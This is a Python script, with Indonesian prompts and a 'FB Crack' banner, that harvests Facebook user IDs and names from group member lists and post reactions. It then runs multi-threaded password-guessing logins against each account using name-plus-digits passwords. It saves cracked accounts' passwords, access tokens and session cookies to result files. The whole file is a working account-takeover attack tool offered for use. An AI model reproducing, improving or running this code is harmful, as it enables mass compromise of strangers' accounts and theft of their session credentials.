import os
import re
import sys
import time
import json
import base64
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from iden import BloksIdentityEngine, FacebookRSAEncrypter
import requests

I = '\033[1;92m' # Hijau
M = '\033[1;91m' # Merah
K = '\033[1;93m' # Kuning
P = '\033[1;97m' # Putih
U = '\033[1;95m' # Ungu

class CrackMassal:
    def __init__(self):
        self.ok = 0
        self.cp = 0
        self.loop = 0
        self.targets = []
        self.passwords = []
        self.cracked_uids = set()
        self.mesin = BloksIdentityEngine()
        self.enc = FacebookRSAEncrypter()
        
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{U}
  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
 ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
 ██║     ██████╔╝███████║██║     █████╔╝ 
 ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
 ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         {P}Multi-Threaded FB Crack - Author by Dezz
        """)

    def generate_passwords(self, name, manual_passwords, metode=1):
        pw_list = []
        if name:
            words = name.lower().split()
            
            # Tentukan suffix berdasarkan pilihan metode
            if metode == 1:
                suffixes = ["123", "1234", "12345", "123456"]
            elif metode == 2:
                suffixes = [f"{i:02d}" for i in range(1, 31)] # 01 sampai 30
            else:
                suffixes = ["123", "1234", "12345", "123456"]

            # 1. Masukkan variasi Nama Depan
            if len(words) >= 1:
                first_word = words[0]
                if len(first_word) >= 3:
                    for suff in suffixes:
                        pw_list.append(first_word.capitalize() + suff)
                    for suff in suffixes:
                        pw_list.append(first_word + suff)
            
            # 2. Masukkan variasi Nama Lengkap (gabungan tanpa spasi)
            if len(words) > 1:
                full_word = "".join(words)
                if len(full_word) >= 3:
                    for suff in suffixes:
                        pw_list.append(full_word.capitalize() + suff)
                    for suff in suffixes:
                        pw_list.append(full_word + suff)
                        
        # Tambahkan password manual (jika ada) di akhir
        for mp in manual_passwords:
            if mp and mp not in pw_list:
                pw_list.append(mp)
                
        # Jika sama sekali kosong (tidak ada nama dan tidak ada manual)
        if not pw_list:
            pw_list = ["123456", "sayang"] # Fallback
            
        return pw_list

    def save_result(self, folder, filename, data):
        if not os.path.exists(folder): os.makedirs(folder, exist_ok=True)
        with open(f"{folder}/{filename}", "a", encoding="utf-8") as f:
            f.write(data + "\n")

    def parse_success(self, res_text, uid, password):
        token = "Tidak Ditemukan"
        cookies = "Tidak Ditemukan"
        
        # Ekstrak Token
        token_match = re.search(r'(EAAB[a-zA-Z0-9]+)', res_text)
        if token_match: token = token_match.group(1)
        
        # Ekstrak Cookies (Metode Normalisasi)
        if "session_cookies" in res_text:
            norm_text = res_text.replace('\\', '')
            cookie_data = re.findall(r'name":"([a-z_]+)","value":"([^"]+)"', norm_text)
            if cookie_data:
                clist = []
                for n, v in cookie_data:
                    if n in ["c_user", "xs", "fr", "datr", "sb", "wd", "presence"]:
                        clist.append(f"{n}={v}")
                cookies = "; ".join(clist) + ";"

        print(f"\r{I}[ SUCCESS ] {uid} | {password} | {token[:20]}...{P}")
        
        self.save_result("Results", "OK.txt", f"{uid}|{password}|{token}|{cookies}")
        self.ok += 1

    def login(self, uid, name, pw):
        if uid in self.cracked_uids:
            return # Skip jika sudah menemukan pass yang cocok (OK/CP)
            
        # Delay Anti-Spam (Adaptasi dari dez1.2)
        time.sleep(2.5)
        
        try:
            m = BloksIdentityEngine() 
            pwd_encoded = self.enc.generate_pwd_enc(pw)
            headers = m.get_headers()
            payload = m.get_payload(pwd_encoded, contact_point=uid)
            
            res = requests.post("https://b-graph.facebook.com/graphql", headers=headers, data=payload, timeout=15)
            resp = res.text
            
            if "access_token" in resp:
                self.cracked_uids.add(uid)
                self.parse_success(resp, uid, pw)
            elif "checkpoint" in resp.lower():
                self.cracked_uids.add(uid)
                print(f"\r{K}[ CHECKPOINT ] {uid} | {pw}{P}")
                self.save_result("Results", "CP.txt", f"{uid}|{pw}")
                self.cp += 1
            elif "e53" in resp.lower() or "error_message" in resp.lower():
                pass
                
        except Exception:
            pass
        
        self.loop += 1
        print(f"\r{P}[*] Crack: {self.loop}/{total_check}  OK:{I}{self.ok}{P}  CP:{K}{self.cp}{P}", end="")

    def start(self, target_file=None):
        self.banner()
        print(f"\n{P}[*] Daftar password yang otomatis dicek:")
        
        # Opsi: Terima file target dari parameter atau minta input manual
        if target_file and os.path.exists(target_file):
            print(f"{I}[+] Menggunakan file target dari hasil dump: {target_file}")
            file_path = target_file
        else:
            file_path = input(f"\n{P}[?] Masukkan nama file target (contoh: target.txt): ")
            
        if not os.path.exists(file_path):
            print(f"{M}[!] File tidak ditemukan!")
            return
            
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) >= 2:
                    self.targets.append((parts[0], parts[1]))
                elif len(parts) == 1 and parts[0]:
                    self.targets.append((parts[0], ""))
        
        if not self.targets:
            print(f"{M}[!] Tidak ada target valid dalam file!")
            return

        print(f"[*] Berhasil memuat {len(self.targets)} target.\n")
        
        print(f"{P}--- METODE PASSWORD ---")
        print(f"{P}[1] Semua Nama (Depan/Tengah/Belakang/Full) + 123, 1234, 12345, 123456")
        print(f"{P}[2] Semua Nama (Depan/Tengah/Belakang/Full) + Angka 01 sampai 30")
        
        try:
            pil_metode = int(input(f"{P}[?] Pilih Metode (1/2): ").strip() or "1")
            if pil_metode not in [1, 2]: pil_metode = 1
        except:
            pil_metode = 1
            
        print(f"[*] Menggunakan Metode: {pil_metode}")
    
        pw_input = input(f"{P}[?] Masukkan Password Tambahan (Opsional, pisahkan koma): ")
        self.passwords = [p.strip() for p in pw_input.split(",") if p.strip()]
        
        try:
            limit = int(input(f"{P}[?] Kecepatan (Thread, default 30): ") or "30")
        except ValueError:
            limit = 30
            
        print(f"{P}[*] Menjalankan crack...\n")
        
        # Susun daftar task dengan password dinamis
        tasks = []
        for uid, name in self.targets:
            pws = self.generate_passwords(name, self.passwords, metode=pil_metode)
            for pw in pws:
                tasks.append((uid, name, pw))
                
        global total_check
        total_check = len(tasks)
        print(f"{P}[*] Total kombinasi password yang akan diproses: {total_check}")
        print(f"{P}[*] Tekan CTRL+C untuk stop.\n")
        
        with ThreadPoolExecutor(max_workers=limit) as executor:
            for uid, name, pw in tasks:
                executor.submit(self.login, uid, name, pw)

        print(f"\n\n{I}[ DONE / SELESAI ]")
        print(f"{I}[+] Akun OK: {self.ok} ( hasil disimpan di Results/OK.txt )")
        print(f"{K}[+] Akun CP: {self.cp} ( hasil disimpan di Results/CP.txt )")


# ==============================================================================
# 2. MODUL AUTH & COOKIE
# ==============================================================================
class AuthManager:
    COOKIE_FILE = "saved_cookie.txt"
    
    @staticmethod
    def get_access_token(cookie):
        headers = {
            "Cookie": cookie,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": "https://www.facebook.com/",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin"
        }
        try:
            r1 = requests.get("https://www.facebook.com/adsmanager/manage/campaigns", headers=headers, timeout=15)
            token = re.search(r'accessToken\s*:\s*["\'](EAAB\w+)["\']', r1.text)
            if token: return token.group(1)
            token = re.search(r'["\'](EAA\w+)["\']', r1.text)
            if token: return token.group(1)
        except: pass

        endpoints = ["https://business.facebook.com/business_locations", "https://business.facebook.com/settings/people/"]
        for url in endpoints:
            try:
                r2 = requests.get(url, headers=headers, timeout=15)
                token = re.search(r'(EAAG\w+|EAAI\w+|EAAAA\w+|EAAC\w+)', r2.text)
                if token: return token.group(1)
            except: continue
                
        try:
            r3 = requests.get("https://www.facebook.com/", headers=headers, timeout=10)
            token = re.search(r'["\']accessToken["\']\s*:\s*["\'](EAA\w+)["\']', r3.text)
            if token: return token.group(1)
        except: pass
        return None

    @classmethod
    def login(cls):
        print(f"\n{P}[ Login Diperlukan ]")
        cookie = ""
        if os.path.exists(cls.COOKIE_FILE):
            try:
                with open(cls.COOKIE_FILE, "r") as f:
                    cookie = f.read().strip()
                if cookie:
                    use_saved = input(f"{P}[?] Gunakan cookie tersimpan? (y/n) [y]: ").strip().lower()
                    if use_saved == 'n': cookie = ""
            except: pass
            
        if not cookie:
            cookie = input(f"{P}[?] Masukkan Cookie Facebook: ").strip()
            if not cookie:
                print(f"{M}[!] Cookie tidak boleh kosong!")
                sys.exit()
            with open(cls.COOKIE_FILE, "w") as f:
                f.write(cookie)
                
        print(f"{P}[*] Mengambil Access Token...")
        token = cls.get_access_token(cookie)
        if not token:
            token = input(f"{K}[?] Gagal ambil otomatis. Masukkan Access Token (EAA...) manual: ").strip()
            if not token:
                print(f"{M}[!] Token diperlukan!")
                sys.exit()
        return cookie, token


# ==============================================================================
# 3. MODUL GRUP DUMPER (Dari dgrub.py)
# ==============================================================================
class GroupDumper:
    def __init__(self, cookie, token):
        self.cookie = cookie
        self.token = token
        self.total = 0
        self.finished = False
        self.doc_id = "3718233543435848979127405069"
        self.ua = "[FBAN/FB4A;FBAV/548.1.0.51.64;FBBV/882676621;FBDM/{density=2.0,width=720,height=1184};FBLC/id_ID;FBRV/894237573;FBCR/XL;FBMF/unknown;FBBD/Android;FBPN/com.facebook.katana;FBDV/Phh-Treble vanilla;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"

    def fetch_page(self, group_id, after_cursor, lock, f):
        if self.finished: return None
        url = "https://graph.facebook.com/graphql"
        headers = {
            "Authorization": f"OAuth {self.token}", "User-Agent": self.ua,
            "Content-Type": "application/x-www-form-urlencoded", "Cookie": self.cookie
        }
        variables = {
            "include_member_list_addon": True, "fetch_view_only_members": True,
            "group_member_profiles_connection_after_cursor": after_cursor,
            "group_view_only_members_pagination_at_stream_initial_count": 1,
            "paginationPK": group_id, "should_use_consolidated_button": True,
            "group_member_profiles_connection_first": 200, "profile_image_size": 128,
            "group_id": group_id
        }
        payload = {
            "method": "post", "format": "json", "server_timestamps": "true",
            "locale": "id_ID", "purpose": "fetch", "fb_api_caller_class": "AtConnection",
            "client_doc_id": self.doc_id, "variables": json.dumps(variables)
        }
        try:
            r = requests.post(url, headers=headers, data=payload, timeout=20)
            data = r.json()
            edges = data.get("data", {}).get("fetch__Group", {}).get("group_member_profiles", {}).get("edges", [])
            if not edges:
                self.finished = True
                return None
            
            c = 0
            with lock:
                for e in edges:
                    uid = e.get("node", {}).get("id")
                    nm = e.get("node", {}).get("name")
                    if uid and nm:
                        f.write(f"{uid}|{nm}\n")
                        c += 1
                f.flush()
                self.total += c
                sys.stdout.write(f"\r{I}[+] Mendump {self.total} id...{P} ")
                sys.stdout.flush()
                
            return data.get("data", {}).get("fetch__Group", {}).get("group_member_profiles", {}).get("page_info", {}).get("end_cursor")
        except:
            time.sleep(2)
            return None

    def start(self):
        print(f"\n{P}--- DUMP GRUP MEMBER ---")
        gid = input(f"{P}[?] ID Grup: ").strip()
        if not gid: return None
        threads = int(input(f"{P}[?] Thread (default 5): ").strip() or "5")
        fname = f"dump_group_{gid}.txt"
        
        lock = threading.Lock()
        print(f"{P}[*] Menjalankan dump... Tekan CTRL+C untuk stop paksa.")
        try:
            with open(fname, "a", encoding="utf-8") as f:
                cur = None
                with ThreadPoolExecutor(max_workers=threads) as exc:
                    while not self.finished:
                        future = exc.submit(self.fetch_page, gid, cur, lock, f)
                        cur = future.result()
                        if not cur: break
        except KeyboardInterrupt:
            self.finished = True
            print(f"\n{K}[!] Dump Dihentikan Manual (CTRL+C).")
        except Exception as e:
            print(f"\n{M}[!] Error: {e}")
            
        print(f"\n{I}[*] Dump Selesai! Tersimpan di: {fname} (Total: {self.total})")
        return fname


# ==============================================================================
# 4. MODUL REACTION DUMPER (Dari rdumb.py)
# ==============================================================================
class ReactionDumper:
    def __init__(self, cookie, token):
        self.cookie = cookie
        self.token = token
        self.total = 0
        self.finished = False
        self.doc_id = "2904796126889595781480664706"
        self.ua = "[FBAN/FB4A;FBAV/548.1.0.51.64;FBBV/882676621;FBDM/{density=2.0,width=720,height=1184};FBLC/id_ID;FBRV/894237573;FBCR/XL;FBMF/unknown;FBBD/Android;FBPN/com.facebook.katana;FBDV/Phh-Treble vanilla;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"

    def format_fbid(self, fbid):
        if fbid.startswith("feedback:"):
            return base64.b64encode(fbid.encode('utf-8')).decode('utf-8'), fbid.replace("feedback:", "")
        if "==" in fbid or fbid.startswith("ZmVlZG"):
            return fbid, fbid[:15]
        return base64.b64encode(f"feedback:{fbid}".encode('utf-8')).decode('utf-8'), fbid

    def fetch_page(self, fbid, rxid, after_cursor, lock, f):
        if self.finished: return None
        url = "https://graph.facebook.com/graphql"
        headers = {
            "Authorization": f"OAuth {self.token}", "User-Agent": self.ua,
            "Content-Type": "application/x-www-form-urlencoded", "Cookie": self.cookie
        }
        variables = {
            "feedback_id": fbid, "fetch_invitable_reactor_count": True,
            "reactors_profile_image_size": 80, "reactors_connection_first": 25,
            "profile_pic_media_type": "image/x-auto", "should_use_consolidated_button": True,
        }
        if rxid: variables["reaction_id"] = rxid
        if after_cursor: variables["reactors_connection_after"] = after_cursor
        
        payload = {
            "method": "post", "format": "json", "server_timestamps": "true",
            "locale": "id_ID", "fb_api_caller_class": "graphservice",
            "client_doc_id": self.doc_id, "variables": json.dumps(variables)
        }
        try:
            r = requests.post(url, headers=headers, data=payload, timeout=20)
            data = r.json()
            edges = data.get("data", {}).get("node", {}).get("reactors", {}).get("edges", [])
            if not edges:
                self.finished = True
                return None
            
            c = 0
            with lock:
                for e in edges:
                    uid = e.get("node", {}).get("id")
                    nm = e.get("node", {}).get("name")
                    if uid and nm:
                        f.write(f"{uid}|{nm}\n")
                        c += 1
                f.flush()
                self.total += c
                sys.stdout.write(f"\r{I}[+] Mendump {self.total} id...{P} ")
                sys.stdout.flush()
                
            return data.get("data", {}).get("node", {}).get("reactors", {}).get("page_info", {}).get("end_cursor")
        except:
            time.sleep(2)
            return None

    def start(self):
        print(f"\n{P}--- DUMP POST REACTION ---")
        pid = input(f"{P}[?] ID Feedback / Post: ").strip()
        if not pid: return None
        fid_b64, fid_safe = self.format_fbid(pid)
        print(f"{P}1=Like, 2=Love, 4=Haha, 7=Sad. Kosongkan u/ semua.")
        rxid = input(f"{P}[?] Tipe (Opsional): ").strip()
        threads = int(input(f"{P}[?] Thread (default 5): ").strip() or "5")
        
        fname = f"dump_reaction_{re.sub(r'[\\\\/*?:\"<>|]', '', fid_safe)}.txt"
        lock = threading.Lock()
        
        print(f"{P}[*] Menjalankan dump... Tekan CTRL+C untuk stop paksa.")
        try:
            with open(fname, "a", encoding="utf-8") as f:
                cur = None
                with ThreadPoolExecutor(max_workers=threads) as exc:
                    while not self.finished:
                        future = exc.submit(self.fetch_page, fid_b64, rxid, cur, lock, f)
                        cur = future.result()
                        if not cur: break
        except KeyboardInterrupt:
            self.finished = True
            print(f"\n{K}[!] Dump Dihentikan Manual (CTRL+C).")
        except Exception as e:
            print(f"\n{M}[!] Error: {e}")
            
        print(f"\n{I}[*] Dump Selesai! Tersimpan di: {fname} (Total: {self.total})")
        return fname


# ==============================================================================
# 5. MAIN MENU CONTROLLER
# ==============================================================================
def main():
    cookie, token = AuthManager.login()
    
    while True:
        print(f"\n{P}===============================")
        print(f"{I}FACEBOOK CRACK MENU")
        print(f"{P}===============================")
        print(f"{P}[1] Dump ID Facebook Group")
        print(f"{P}[2] Dump ID Post Reaction")
        print(f"{P}[3] Crack Account")
        print(f"{M}[0] Keluar")
        
        c = input(f"\n{P}[?] Pilih: ").strip()
        
        if c == "0":
            sys.exit()
            
        elif c == "1":
            file_result = GroupDumper(cookie, token).start()
            if file_result and os.path.getsize(file_result) > 0:
                lanjut = input(f"\n{P}[?] Ingin langsung Crack file '{file_result}' ini sekarang? (y/n): ").strip().lower()
                if lanjut == 'y': CrackMassal().start(target_file=file_result)

        elif c == "2":
            file_result = ReactionDumper(cookie, token).start()
            if file_result and os.path.getsize(file_result) > 0:
                lanjut = input(f"\n{P}[?] Ingin langsung Crack file '{file_result}' ini sekarang? (y/n): ").strip().lower()
                if lanjut == 'y': CrackMassal().start(target_file=file_result)
                
        elif c == "3":
            CrackMassal().start()
            
        else:
            print(f"{M}[!] Pilihan tidak valid.")

if __name__ == "__main__":
    main()
